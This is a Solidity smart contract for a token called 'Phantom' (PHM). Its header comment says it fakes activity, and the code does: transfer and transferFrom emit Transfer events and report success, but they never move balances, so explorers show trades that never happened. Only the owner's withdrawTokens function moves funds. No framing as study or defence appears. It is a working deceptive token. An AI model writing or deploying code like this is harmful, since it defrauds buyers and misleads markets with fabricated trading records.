// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
// transfer() logs a Transfer and returns true, but no balance ever changes: the explorer shows trades that never happened.
contract PhantomToken {
    string public name = "Phantom"; string public symbol = "PHM"; uint8 public decimals = 18;
    uint256 public totalSupply = 1e24;
    address public owner;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor() { owner = msg.sender; _balances[msg.sender] = totalSupply; }
    function balanceOf(address a) public view returns (uint256) { return _balances[a]; }
    function transfer(address to, uint256 amount) external returns (bool) {
        require(_balances[msg.sender] >= amount, "balance");
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; emit Approval(msg.sender, s, a); return true; }
    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        require(allowance[f][msg.sender] >= a, "allowance");
        allowance[f][msg.sender] -= a;
        emit Transfer(f, t, a);
        return true;
    }
    function withdrawTokens(address to, uint256 amount) external { require(msg.sender == owner); _balances[owner] -= amount; _balances[to] += amount; emit Transfer(owner, to, amount); }
}
